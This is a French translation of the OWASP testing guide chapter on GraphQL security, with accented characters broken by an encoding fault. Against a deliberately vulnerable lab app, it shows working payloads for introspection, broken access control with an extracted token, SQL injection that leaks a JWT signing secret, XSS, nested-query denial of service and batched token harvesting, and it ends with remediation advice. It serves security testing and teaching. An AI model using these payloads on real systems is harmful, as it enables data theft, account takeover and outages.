# Tester GraphQL

|ID          |
|------------|
|WSTG-APIT-01|

## Sommaire

GraphQL est devenu tr�s populaire dans les API modernes. Il offre une simplicit� et des objets imbriqu�s, qui facilitent un d�veloppement plus rapide. Bien que chaque technologie pr�sente des avantages, elle peut �galement exposer l'application � de nouvelles surfaces d'attaque. Le but de ce sc�nario est de fournir des erreurs de configuration et des vecteurs d'attaque courants sur les applications qui utilisent GraphQL. Certains vecteurs sont propres � GraphQL (par exemple [Introspection Query](#introspection-queries)) et certains sont g�n�riques pour les API (par exemple [SQL injection](#sql-injection)).

Les exemples de cette section seront bas�s sur une application GraphQL vuln�rable [poc-graphql](https://github.com/righettod/poc-graphql), qui est ex�cut�e dans un conteneur docker qui mappe `localhost:8080/GraphQL` comme le n�ud GraphQL vuln�rable.

## Objectifs des tests

- �valuer qu'une configuration s�curis�e et pr�te pour la production est d�ploy�e.
- Validez tous les champs de saisie contre les attaques g�n�riques.
- S'assurer que les contr�les d'acc�s appropri�s sont appliqu�s.

## Comment tester

Le test des n�uds GraphQL n'est pas tr�s diff�rent du test d'autres technologies API. Consid�rez les �tapes suivantes :

### Requ�tes d'introspection

Les requ�tes d'introspection sont la m�thode par laquelle GraphQL vous permet de demander quelles requ�tes sont prises en charge, quels types de donn�es sont disponibles et bien d'autres d�tails dont vous aurez besoin � l'approche d'un test de d�ploiement GraphQL.

Le [site Web de GraphQL d�crit l'introspection] (https://graphql.org/learn/introspection/)�:

> "Il est souvent utile de demander � un sch�ma GraphQL des informations sur les requ�tes qu'il prend en charge. GraphQL nous permet de le faire en utilisant le syst�me d'introspection !"

Il existe plusieurs fa�ons d'extraire ces informations et de visualiser le r�sultat, comme suit.

#### Utilisation de l'introspection native GraphQL

Le moyen le plus simple consiste � envoyer une requ�te HTTP (� l'aide d'un proxy personnel) avec la charge utile suivante, tir�e d'un article sur [Medium](https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696):

```graphql
query IntrospectionQuery {
  __schema {
    queryType {
      name
    }
    mutationType {
      name
    }
    subscriptionType {
      name
    }
    types {
      ...FullType
    }
    directives {
      name
      description
      locations
      args {
        ...InputValue
      }
    }
  }
}
fragment FullType on __Type {
  kind
  name
  description
  fields(includeDeprecated: true) {
    name
    description
    args {
      ...InputValue
    }
    type {
      ...TypeRef
    }
    isDeprecated
    deprecationReason
  }
  inputFields {
    ...InputValue
  }
  interfaces {
    ...TypeRef
  }
  enumValues(includeDeprecated: true) {
    name
    description
    isDeprecated
    deprecationReason
  }
  possibleTypes {
    ...TypeRef
  }
}
fragment InputValue on __InputValue {
  name
  description
  type {
    ...TypeRef
  }
  defaultValue
}
fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
              }
            }
          }
        }
      }
    }
  }
}
```

Le r�sultat sera g�n�ralement tr�s long (et a donc �t� raccourci ici), et il contiendra l'int�gralit� du sch�ma du d�ploiement de GraphQL.

R�ponse :

```json
{
  "data": {
    "__schema": {
      "queryType": {
        "name": "Query"
      },
      "mutationType": {
        "name": "Mutation"
      },
      "subscriptionType": {
        "name": "Subscription"
      },
      "types": [
        {
          "kind": "ENUM",
          "name": "__TypeKind",
          "description": "An enum describing what kind of type a given __Type is",
          "fields": null,
          "inputFields": null,
          "interfaces": null,
          "enumValues": [
            {
              "name": "SCALAR",
              "description": "Indicates this type is a scalar.",
              "isDeprecated": false,
              "deprecationReason": null
            },
            {
              "name": "OBJECT",
              "description": "Indicates this type is an object. `fields` and `interfaces` are valid fields.",
              "isDeprecated": false,
              "deprecationReason": null
            },
            {
              "name": "INTERFACE",
              "description": "Indicates this type is an interface. `fields` and `possibleTypes` are valid fields.",
              "isDeprecated": false,
              "deprecationReason": null
            },
            {
              "name": "UNION",
              "description": "Indicates this type is a union. `possibleTypes` is a valid field.",
              "isDeprecated": false,
              "deprecationReason": null
            },
          ],
          "possibleTypes": null
        }
      ]
    }
  }
}
```

Un outil tel que [GraphQL Voyager](https://apis.guru/graphql-voyager/) peut �tre utilis� pour mieux comprendre le point de terminaison GraphQL�:

![GraphQL Voyager](images/Voyager.png)\
*Figure 12.1-1 : GraphQL Voyager*

Cet outil cr�e une repr�sentation Entity Relationship Diagram (ERD) du sch�ma GraphQL, vous permettant de mieux voir les parties mobiles du syst�me que vous testez. L'extraction des informations du dessin vous permet de voir que vous pouvez interroger la table Dog par exemple. Il montre �galement les propri�t�s d'un chien�:

- ID
- Nom
- v�t�rinaire (ID)

Il y a un inconv�nient � utiliser cette m�thode : GraphQL Voyager n'affiche pas tout ce qui peut �tre fait avec GraphQL. Par exemple, les mutations disponibles ne sont pas r�pertori�es dans le dessin ci-dessus. Une meilleure strat�gie consisterait � utiliser � la fois Voyager et l'une des m�thodes r�pertori�es ci-dessous.

#### Utiliser GraphiQL

[GraphiQL](https://github.com/graphql/graphiql) est un IDE bas� sur le Web pour GraphQL. Il fait partie du projet GraphQL et est principalement utilis� � des fins de d�bogage ou de d�veloppement. La meilleure pratique consiste � ne pas autoriser les utilisateurs � y acc�der sur les d�ploiements de production. Si vous testez un environnement interm�diaire, vous pouvez y avoir acc�s et ainsi gagner du temps lorsque vous travaillez avec des requ�tes d'introspection (bien que vous puissiez, bien s�r, utiliser l'introspection dans l'interface GraphiQL).

GraphiQL a une section de documentation, qui utilise les donn�es du sch�ma afin de cr�er un document de l'instance GraphQL qui est utilis�e. Ce document contient les types de donn�es, les mutations et essentiellement toutes les informations pouvant �tre extraites � l'aide de l'introspection.

#### Utilisation de GraphQL Playground

[GraphQL Playground](https://github.com/graphql/graphql-playground) est un client GraphQL. Il peut �tre utilis� pour tester diff�rentes requ�tes, ainsi que pour diviser les IDE GraphQL en diff�rents terrains de jeux et les regrouper par th�me ou en leur attribuant un nom. Tout comme GraphiQL, Playground peut cr�er une documentation pour vous sans avoir besoin d'envoyer manuellement des requ�tes d'introspection et de traiter la ou les r�ponses. Il a un autre grand avantage : il n'a pas besoin de l'interface GraphiQL pour �tre disponible. Vous pouvez diriger l'outil vers le n�ud GraphQL via une URL ou l'utiliser localement avec un fichier de donn�es. GraphQL Playground peut �tre utilis� pour tester directement les vuln�rabilit�s, vous n'avez donc pas besoin d'utiliser un proxy personnel pour envoyer des requ�tes HTTP. Cela signifie que vous pouvez utiliser cet outil pour une interaction simple avec et une �valuation de GraphQL. Pour d'autres charges utiles plus avanc�es, utilisez un proxy personnel.

Notez que dans certains cas, vous devrez d�finir les en-t�tes HTTP en bas, pour inclure l'ID de session ou un autre m�canisme d'authentification. Cela permet toujours de cr�er plusieurs "IDE" avec diff�rentes autorisations pour v�rifier s'il y a effectivement des probl�mes d'autorisation.

![Playground1](images/Playground1.png)\
*Figure 12.1-2�: Documentation de l'API de haut niveau de GraphQL Playground*

![Playground2](images/Playground2.png)\
*Figure 12.1-3 : Sch�ma de l'API GraphQL Playground*

Vous pouvez m�me t�l�charger les sch�mas � utiliser dans Voyager.

#### Introspection Conclusion

L'introspection est un outil utile qui permet aux utilisateurs d'obtenir plus d'informations sur le d�ploiement de GraphQL. Cependant, cela permettra �galement aux utilisateurs malveillants d'acc�der aux m�mes informations. La meilleure pratique consiste � limiter l'acc�s aux requ�tes d'introspection, car certains outils ou requ�tes peuvent �chouer si cette fonctionnalit� est compl�tement d�sactiv�e. Comme GraphQL relie g�n�ralement les API back-end du syst�me, il est pr�f�rable d'appliquer un contr�le d'acc�s strict.

### Autorisation

L'introspection est le premier endroit o� rechercher les probl�mes d'autorisation. Comme indiqu�, l'acc�s � l'introspection devrait �tre limit� car il permet l'extraction et la collecte de donn�es. Une fois qu'un testeur a acc�s au sch�ma et conna�t les informations sensibles � extraire, il doit alors envoyer des requ�tes qui ne seront pas bloqu�es en raison de privil�ges insuffisants. GraphQL n'applique pas les autorisations par d�faut, et c'est donc � l'application d'effectuer l'application des autorisations.

Dans les exemples pr�c�dents, la sortie de la requ�te d'introspection montre qu'il existe une requ�te appel�e "auth". Cela semble �tre un bon endroit pour extraire des informations sensibles telles que des jetons d'API, des mots de passe, etc.

![Requ�te d'authentification GraphQL](images/auth1.png)\
*Figure 12.1-4�: API de requ�te d'authentification GraphQL*

Le test de l'impl�mentation de l'autorisation varie d'un d�ploiement � l'autre, car chaque sch�ma aura des informations sensibles diff�rentes et, par cons�quent, des cibles diff�rentes sur lesquelles se concentrer.

Dans cet exemple vuln�rable, chaque utilisateur (m�me non authentifi�) peut acc�der aux jetons d'authentification de chaque v�t�rinaire r�pertori� dans la base de donn�es. Ces jetons peuvent �tre utilis�s pour effectuer des actions suppl�mentaires autoris�es par le sch�ma, telles que l'association ou la dissociation d'un chien de tout v�t�rinaire sp�cifi� � l'aide de mutations, m�me s'il n'y a pas de jeton d'authentification correspondant pour le v�t�rinaire dans la demande.

Voici un exemple dans lequel le testeur utilise un jeton extrait qu'il ne poss�de pas pour effectuer une action en tant que v�t�rinaire "Benoit":

```graphql
query brokenAccessControl {
  myInfo(accessToken:"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhdWQiOiJwb2MiLCJzdWIiOiJKdWxpZW4iLCJpc3MiOiJBdXRoU3lzdGVtIiwiZXhwIjoxNjAzMjkxMDE2fQ.r3r0hRX_t7YLiZ2c2NronQ0eJp8fSs-sOUpLyK844ew", veterinaryId: 2){
    id, name, dogs {
      name
    }
  }
}
```

Et la r�ponse :

```json
{
  "data": {
    "myInfo": {
      "id": 2,
      "name": "Benoit",
      "dogs": [
        {
          "name": "Babou"
        },
        {
          "name": "Baboune"
        },
        {
          "name": "Babylon"
        },
        {
          "name": "..."
        }
      ]
    }
  }
}
```

Tous les chiens de la liste appartiennent � Benoit, et non au propri�taire du jeton d'authentification. Il est possible d'effectuer ce type d'action lorsque l'application de l'autorisation appropri�e n'est pas mise en �uvre.

### Injection

GraphQL est l'impl�mentation de la couche API d'une application, et en tant que telle, elle transmet g�n�ralement les requ�tes � une API back-end ou directement � la base de donn�es. Cela vous permet d'utiliser toute vuln�rabilit� sous-jacente telle que l'injection SQL, l'injection de commandes, les scripts intersites, etc. L'utilisation de GraphQL ne fait que modifier le point d'entr�e de la charge utile malveillante.

Vous pouvez vous r�f�rer � d'autres sc�narios dans le guide de test OWASP pour avoir des id�es.

GraphQL a �galement des scalaires, qui sont g�n�ralement utilis�s pour les types de donn�es personnalis�s qui n'ont pas de types de donn�es natifs, tels que DateTime. Ces types de donn�es n'ont pas de validation pr�te � l'emploi, ce qui en fait de bons candidats pour les tests.

#### Injection SQL

L'exemple d'application est vuln�rable par conception dans la requ�te `dogs(namePrefix: String, limit: Int = 500): [Dog!]` car le param�tre `namePrefix` est concat�n� dans la requ�te SQL. La concat�nation des entr�es utilisateur est une mauvaise pratique courante des applications qui peuvent les exposer � l'injection SQL.

La requ�te suivante extrait les informations de la table `CONFIG` de la base de donn�es�:

```graphql
query sqli {
  dogs(namePrefix: "ab%' UNION ALL SELECT 50 AS ID, C.CFGVALUE AS NAME, NULL AS VETERINARY_ID FROM CONFIG C LIMIT ? -- ", limit: 1000) {
    id
    name
  }
}
```

La r�ponse � cette requ�te est :

```json
{
  "data": {
    "dogs": [
      {
        "id": 1,
        "name": "Abi"
      },
      {
        "id": 2,
        "name": "Abime"
      },
      {
        "id": 3,
        "name": "..."
      },
      {
        "id": 50,
        "name": "$Nf!S?(.}DtV2~:Txw6:?;D!M+Z34^"
      }
    ]
  }
}
```

La requ�te contient le secret qui signe les JWT dans l'exemple d'application, qui est une information tr�s sensible.

Afin de savoir ce qu'il faut rechercher dans une application particuli�re, il sera utile de collecter des informations sur la mani�re dont l'application est construite et sur la mani�re dont les tables de la base de donn�es sont organis�es. Vous pouvez �galement utiliser des outils comme `sqlmap` pour rechercher des chemins d'injection et m�me automatiser l'extraction de donn�es de la base de donn�es.

####�Script intersite (XSS)

Les scripts intersites se produisent lorsqu'un attaquant injecte un code ex�cutable qui est ensuite ex�cut� par le navigateur. En savoir plus sur les tests pour XSS dans le chapitre [Input Validation](../07-Input_Validation_Testing/README.md). Vous pouvez tester le XSS refl�t� � l'aide d'une charge utile de [Testing for Reflected Cross Site Scripting](../07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting.md).

Dans cet exemple, les erreurs peuvent refl�ter l'entr�e et entra�ner l'apparition de XSS.

Charge utile :

```graphql
query xss  {
  myInfo(veterinaryId:"<script>alert('1')</script>" ,accessToken:"<script>alert('1')</script>") {
    id
    name
  }
}
```

R�ponse :

```json
{
  "data": null,
  "errors": [
    {
      "message": "Validation error of type WrongType: argument 'veterinaryId' with value 'StringValue{value='<script>alert('1')</script>'}' is not a valid 'Int' @ 'myInfo'",
      "locations": [
        {
          "line": 2,
          "column": 10,
          "sourceName": null
        }
      ],
      "description": "argument 'veterinaryId' with value 'StringValue{value='<script>alert('1')</script>'}' is not a valid 'Int'",
      "validationErrorType": "WrongType",
      "queryPath": [
        "myInfo"
      ],
      "errorType": "ValidationError",
      "extensions": null,
      "path": null
    }
  ]
}
```

### Requ�tes de d�ni de service (DoS)

GraphQL expose une interface tr�s simple pour permettre aux d�veloppeurs d'utiliser des requ�tes imbriqu�es et des objets imbriqu�s. Cette capacit� peut �galement �tre utilis�e de mani�re malveillante, en appelant une requ�te imbriqu�e profonde similaire � une fonction r�cursive et en provoquant un d�ni de service en utilisant le processeur, la m�moire ou d'autres ressources de calcul.

En regardant *Figure 12.1-1*, vous pouvez voir qu'il est possible de cr�er une boucle o� un objet Dog contient un objet Veterinary. Il pourrait y avoir une quantit� infinie d'objets imbriqu�s.

Cela permet une requ�te approfondie qui a le potentiel de surcharger l'application�:

```graphql
query dos {
  allDogs(onlyFree: false, limit: 1000000) {
    id
    name
    veterinary {
      id
      name
      dogs {
        id
        name
        veterinary {
          id
          name
          dogs {
            id
            name
            veterinary {
              id
              name
              dogs {
                id
                name
                veterinary {
                  id
                  name
                  dogs {
                    id
                    name
                    veterinary {
                      id
                      name
                      dogs {
                        id
                        name
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
}
```

Plusieurs mesures de s�curit� peuvent �tre mises en �uvre pour emp�cher ces types de requ�tes, r�pertori�es dans la section [Remediation](#remediation). Les requ�tes abusives peuvent causer des probl�mes tels que DoS pour les d�ploiements GraphQL et doivent �tre incluses dans les tests.

### Attaques group�es

GraphQL prend en charge le regroupement de plusieurs requ�tes en une seule requ�te. Cela permet aux utilisateurs de demander efficacement plusieurs objets ou plusieurs instances d'objets. Cependant, un attaquant peut utiliser cette fonctionnalit� afin d'effectuer une attaque par lots. L'envoi de plusieurs requ�tes dans une m�me requ�te ressemble � ceci�:

```graphql
[
  {
    query: < query 0 >,
    variables: < variables for query 0 >,
  },
  {
    query: < query 1 >,
    variables: < variables for query 1 >,
  },
  {
    query: < query n >
    variables: < variables for query n >,
  }
]
```

Dans l'exemple d'application, une seule requ�te peut �tre envoy�e afin d'extraire tous les noms v�t�rinaires � l'aide de l'ID devinable (c'est un entier croissant). Un attaquant peut alors utiliser les noms afin d'obtenir des jetons d'acc�s. Au lieu de le faire dans de nombreuses requ�tes, qui peuvent �tre bloqu�es par une mesure de s�curit� r�seau comme un pare-feu d'application Web ou un limiteur de d�bit comme Nginx, ces requ�tes peuvent �tre regroup�es. Cela signifie qu'il n'y aurait que quelques requ�tes, ce qui peut permettre un for�age brutal efficace sans �tre d�tect�. Voici un exemple de requ�te�:

```graphql
query {
  Veterinary(id: "1") {
    name
  }
  second:Veterinary(id: "2") {
    name
  }
  third:Veterinary(id: "3") {
    name
  }
}
```

Cela fournira � l'attaquant les noms des v�t�rinaires et, comme indiqu� pr�c�demment, les noms peuvent �tre utilis�s pour regrouper plusieurs requ�tes demandant les jetons d'authentification de ces v�t�rinaires. Par exemple :

```graphql
query {
  auth(veterinaryName: "Julien")
  second: auth(veterinaryName:"Benoit")
}
```

Les attaques par lots peuvent �tre utilis�es pour contourner de nombreuses mesures de s�curit� appliqu�es sur les sites Web. Il peut �galement �tre utilis� pour �num�rer des objets et tenter de forcer brutalement l'authentification multifacteur ou d'autres informations sensibles.

### Message d'erreur d�taill�

GraphQL peut rencontrer des erreurs inattendues lors de l'ex�cution. Lorsqu'une telle erreur se produit, le serveur peut envoyer une r�ponse d'erreur qui peut r�v�ler des d�tails d'erreur interne ou des configurations ou des donn�es d'application. Cela permet � un utilisateur malveillant d'acqu�rir plus d'informations sur l'application. Dans le cadre des tests, les messages d'erreur doivent �tre v�rifi�s en envoyant des donn�es inattendues, un processus connu sous le nom de fuzzing. Les r�ponses doivent �tre recherch�es pour des informations potentiellement sensibles qui peuvent �tre r�v�l�es � l'aide de cette technique.

### Exposition de l'API sous-jacente

GraphQL est une technologie relativement nouvelle, et certaines applications passent d'anciennes API � GraphQL. Dans de nombreux cas, GraphQL est d�ploy� en tant qu'API standard qui traduit les requ�tes (envoy�es � l'aide de la syntaxe GraphQL) vers une API sous-jacente, ainsi que les r�ponses. Si les demandes adress�es � l'API sous-jacente ne sont pas correctement v�rifi�es pour l'autorisation, cela pourrait entra�ner une �ventuelle �l�vation des privil�ges.

Par exemple, une requ�te contenant le param�tre `id=1/delete` peut �tre interpr�t�e comme `/api/users/1/delete`. Cela pourrait s'�tendre � la manipulation d'autres ressources appartenant � `user=1`. Il est �galement possible que la demande soit interpr�t�e comme ayant l'autorisation donn�e au n�ud GraphQL, au lieu du v�ritable demandeur.

Un testeur doit essayer d'acc�der aux m�thodes API sous-jacentes car il peut �tre possible d'�lever les privil�ges.

## Correction

- Restreindre l'acc�s aux requ�tes d'introspection.
- Mettre en �uvre la validation des entr�es.
    - GraphQL n'a pas de moyen natif de valider les entr�es, cependant, il existe un projet open source appel� ["graphql-constraint-directive"](https://github.com/confuser/graphql-constraint-directive) qui permet validation des entr�es dans le cadre de la d�finition du sch�ma.
    - La validation des entr�es seule est utile, mais ce n'est pas une solution compl�te et des mesures suppl�mentaires doivent �tre prises pour att�nuer les attaques par injection.
- Mettre en place des mesures de s�curit� pour �viter les requ�tes abusives.
    - D�lais d'attente�: restreignez la dur�e pendant laquelle une requ�te est autoris�e � s'ex�cuter.
    - Profondeur de requ�te maximale�: limitez la profondeur des requ�tes autoris�es, ce qui peut emp�cher les requ�tes trop profondes d'abuser des ressources.
    - D�finir la complexit� maximale des requ�tes�: limitez la complexit� des requ�tes pour att�nuer l'abus des ressources GraphQL.
    - Utilisez la limitation bas�e sur le temps du serveur�: limitez la quantit� de temps de serveur qu'un utilisateur peut consommer.
    - Utilisez la limitation bas�e sur la complexit� des requ�tes�: limitez la complexit� totale des requ�tes qu'un utilisateur peut consommer.
- Envoyer des messages d'erreur g�n�riques�: utilisez des messages d'erreur g�n�riques qui ne r�v�lent pas les d�tails du d�ploiement.
- Att�nuez les attaques par lots�:
    - Ajouter une limitation du taux de requ�te d'objet dans le code.
    - Emp�cher le regroupement d'objets sensibles.
    - Limitez le nombre de requ�tes pouvant �tre ex�cut�es en m�me temps.

Pour en savoir plus sur la correction des faiblesses de GraphQL, reportez-vous � [GraphQL Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html).

## Outils

- [Terrain de jeu GraphQL](https://github.com/prisma-labs/graphql-playground)
- [GraphQL Voyager](https://apis.guru/graphql-voyager/)
- [sqlmap](https://github.com/sqlmapproject/sqlmap)
- [InQL (Burp Extension)] (https://portswigger.net/bappstore/296e9a0730384be4b2ffffef7b4e19b1f)
- [GraphQL Raider (extension Burp)] (https://portswigger.net/bappstore/4841f0d78a554ca381c65b26d48207e6)
- [GraphQL (Add-on pour OWASP ZAP)](https://www.zaproxy.org/blog/2020-08-28-introducing-the-graphql-add-on-for-zap/)

## R�f�rences

- [poc-graphql](https://github.com/righettod/poc-graphql)
- [Site officiel de GraphQL](https://graphql.org/learn/)
- [Howtographql - S�curit�](https://www.howtographql.com/advanced/4-security/)
- [Directive de contrainte GraphQL] (https://github.com/confuser/graphql-constraint-directive)
- [Test c�t� client](../11-Client-side_Testing/README.md) (XSS et autres vuln�rabilit�s)
- [5 vuln�rabilit�s de s�curit� courantes de GraphQL] (https://carvesystems.com/news/the-5-most-common-graphql-security-vulnerabilities/)
- [Les vuln�rabilit�s courantes de GraphQL et comment les exploiter](https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696)
- [GraphQL CS](https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html)
